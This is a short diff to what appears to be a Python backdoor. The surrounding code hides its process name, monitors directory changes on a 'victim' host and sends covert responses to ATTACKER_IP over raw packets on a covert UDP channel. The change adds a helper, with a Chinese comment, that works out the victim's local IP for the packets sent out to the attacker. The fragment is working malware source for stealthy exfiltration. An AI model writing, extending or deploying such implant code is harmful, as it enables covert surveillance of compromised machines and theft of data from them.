@@ -29,6 +29,15 @@ mon_dir_events = []    # store directory change events
 # Lock for logging data structures
 data_lock = threading.Lock()
 
+def get_local_ip(dest_ip, dest_port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 用 Victim 的 UDP 端口（这里用 COVERT_UDP_PORT）来探路
+    s.connect((dest_ip, dest_port))
+    local_ip = s.getsockname()[0]
+    s.close()
+    return local_ip
+
+
 def hide_process():
     """Hide process by changing its name."""
     try:
@@ -258,10 +267,8 @@ def send_covert_response(data_bytes):
     if len(message) % 2 != 0:
         message += b'\x00'
     # Use victim (this host) IP as source
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect((ATTACKER_IP, 0))
-    src_ip = s.getsockname()[0]
-    s.close()
+    # src_ip = socket.gethostbyname(socket.gethostname())
+    src_ip = get_local_ip(ATTACKER_IP, COVERT_UDP_PORT)
     dst_ip = ATTACKER_IP
     src_addr = socket.inet_aton(src_ip)
     dst_addr = socket.inet_aton(dst_ip)
